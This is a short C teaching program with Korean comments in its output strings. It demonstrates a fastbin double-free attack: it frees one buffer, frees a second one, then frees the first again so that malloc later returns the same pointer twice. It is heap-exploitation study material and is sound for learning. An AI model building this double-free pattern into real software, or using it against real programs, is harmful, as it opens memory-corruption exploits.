#include <stdio.h>

#include <stdlib.h>

int main(){
  printf("이 파일은 fastbin 을 이용해 double free attack이 가능하다는걸 보여줍니다..\n");

  printf("버퍼 3개를 할당 합니다.\n");

  int *a = malloc(8);	int *b = malloc(8);	int *c = malloc(8); printf("1st malloc(8): %p\n", a);	printf("2nd malloc(8): %p\n", b);	printf("3rd malloc(8): %p\n", c);
  printf("첫번쨰 free..\n");

  free(a);
  printf("만약 우리가 다시 %p 를 free 한다면, %p가 free를 한 목록 맨위에 있기 떄문에 문제가 발생합니다..\n", a, a);

  // free(a);
  printf("그래서 대신에, 우리는 %p 를 free 할것입니다. \n", b);

  free(b);
  printf("그것이 free list의 맨 위에 있지 않기 때문에, 우리는 %p 를 다시 free 할수 있습니다.\n", a);

  free(a);
  printf("지금 우리는 free list [ %p, %p, %p ] 를 가졌고. 만약 우리가 malloc 을 3번 했다면, 우리는 %p 를 두번 가질것이다!\n", a, b, a, a);

  printf("1st malloc(8): %p\n", malloc(8));	printf("2nd malloc(8): %p\n", malloc(8));	printf("3rd malloc(8): %p\n", malloc(8));
  }






